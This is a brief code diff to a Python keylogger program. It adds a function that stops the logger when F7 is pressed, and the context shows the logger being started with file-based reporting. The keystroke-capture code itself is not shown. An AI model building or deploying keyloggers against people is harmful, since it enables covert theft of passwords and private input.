@@ -49,6 +49,12 @@ class Keylogger:
             else:
                 pass
             keyboard.unhook_all()
+            
+def stop_keylogger():
+    while True:
+        if keyboard.is_pressed("f7"):
+            keylogger.running = False
+            break
 
 if __name__ == "__main__":
     keylogger = Keylogger(report_method="file")
